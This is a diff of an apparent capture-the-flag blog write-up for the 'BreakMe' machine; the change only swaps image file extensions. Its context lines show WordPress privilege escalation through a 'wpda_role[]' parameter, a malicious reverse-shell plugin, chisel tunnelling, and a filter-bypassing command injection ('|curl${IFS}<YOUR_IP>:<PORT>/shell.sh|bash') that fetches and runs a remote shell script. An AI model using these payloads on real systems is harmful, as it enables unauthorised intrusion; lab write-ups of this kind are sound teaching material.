@@ -37,7 +37,7 @@ Nmap done: 1 IP address (1 host up) scanned in 19.55 seconds
 
 <h2>Step 2: Enumerating the webserver</h2>
 <p>Surfing to the IP address, I was greeted with the default apache server page:</p>
-<img src="/images/breakme/breakme_apache_default.png" alt="default apache page" class="postImage">
+<img src="/images/breakme/breakme_apache_default.webp" alt="default apache page" class="postImage">
 <p>After some directory bruteforcing using ffuf, I found outt that there is a Wordpress site:</p>
 <pre>
 ──(kali㉿kali)-[/opt]
@@ -152,12 +152,12 @@ Trying bob / anthony Time: 00:00:01 <                                           
 
 <h2>Step 3: gaining access</h2>
 <p>This scan revealed a lot. First, Two users were found: bob & admin. Of those, It was able to bruteforce the password of Bob. Last, the script also noted that the wp-data plugin was out of date. With these newly obtained credentials, I decided to login as Bob to the Wordpress panel:</p>
-<img src="/images/breakme/breakme_no_admin_options.png" alt="Wordpress login as bob" class="postImage">
+<img src="/images/breakme/breakme_no_admin_options.webp" alt="Wordpress login as bob" class="postImage">
 <p>Unfortunately, Bob is not an admin which can be seen by the lack of options the Wordpress panel. As stated before, WpScan revealed that the "WP-DATA-ACCESS" plugin was out of date. With some Googling, I discovered a privilege escalation vulnerability in this old version of "WP-DATA-ACCESS". The exploit is linked here: <span class="url"><a href="https://github.com/thomas-osgood/cve-2023-1874">WP-DATA-ACCESS privilege escalation</a></span>.</p>
 <p>Instead of just running the Python script, I looked at the code to understand what it was doing and exploited it myself using Burpsuite. It appears we just need to update our profile, Intercept the request using Burpsuite and add the following to the request parameters: "wpda_role[] = 'Administrator'". In Burpsuite, it looks like this: </p>
-<img src="/images/breakme/breakme_escalate_privileges.png" alt="Burpsuite payload privilege escalation" class="postImage">
+<img src="/images/breakme/breakme_escalate_privileges.webp" alt="Burpsuite payload privilege escalation" class="postImage">
 <p>Refreshing the Wordpress panel yields us the user bob escalated to admin!</p>
-<img src="/images/breakme/breakme_getting_admin_wordpress_overview.png" alt="Wordpress panel with admin privileges" class="postImage">
+<img src="/images/breakme/breakme_getting_admin_wordpress_overview.webp" alt="Wordpress panel with admin privileges" class="postImage">
 <p>Now that we have admin privileges, a reverse shell is easily obtained. For this, grab a malicious reverse shell payload plugin from github (<span class="url"><a href="https://github.com/thomas-osgood/cve-2023-1874">Reverse shell plugin Wordpress</a></span>), start a listener on the attacking the device and install the malicious plugin through the Wordpress admin panel. </p>
 <p>Specifically, these steps can be followed:</p>
 <pre>
@@ -205,12 +205,12 @@ wget &lt;IP-Address&gt;&lt;PORT&gt;/chisel
 ./chisel client &lt;YOUR_IP&gt;:1234 R:9999:127.0.0.1:9999
 </pre>
 <p>Now, open a browser and surf to localhost:9999 to view the contents of the webserver:</p>
-<img src="/images/breakme/breakme_internal_webserver.png" alt="Internal webserver initial page" class="postImage">
+<img src="/images/breakme/breakme_internal_webserver.webp" alt="Internal webserver initial page" class="postImage">
 <p>We are greeted with 3 input fields. Initial exploration revealed that the first input field performs a ping to the requested Ip address. The second input field looks for a user and the third for a file. It's quite obvious here that we probably have some kind of command injection vulnerability. In the first input field, entering anything other than a valid IP address fails. Therefore, it seemed that this input field is not all that valuable to us. The second input field seemed more interesting. To verify whether command injection was possible, I tested some special characters. Most of them where filtered except: $|{}?. Using this knowledge, I started crafting an initial payload to test whether there was command injection:</p>
 <pre>
 |ping${IFS}10.9.235.177
 </pre>
-<img src="/images/breakme/breakme_payload.png" alt="burpsuite payload privilege escalation" class="postImage">
+<img src="/images/breakme/breakme_payload.webp" alt="burpsuite payload privilege escalation" class="postImage">
 <p>The payload uses the "|" to breakout of the current command that is running. As spaces are also filtered, I used the internal field separator (${IFS}) which defaults to a space in linux.</p>
 <p>Success, Command injection is achieved:</p>
 <pre>
@@ -241,7 +241,7 @@ nc -lnvp &lt;PORT&gt;
 <pre>
 |curl${IFS}&lt;YOUR_IP&gt;:&lt;PORT&gt;/shell.sh|bash
 </pre>
-<img src="/images/breakme/breakme_payload_rev_shell.png" alt="burpsuite reverse shell payload" class="postImage">
+<img src="/images/breakme/breakme_payload_rev_shell.webp" alt="burpsuite reverse shell payload" class="postImage">
 <p>If everything went right, a shell as john should have spawned:</p>
 <pre>
 ┌──(kali㉿kali)-[~]
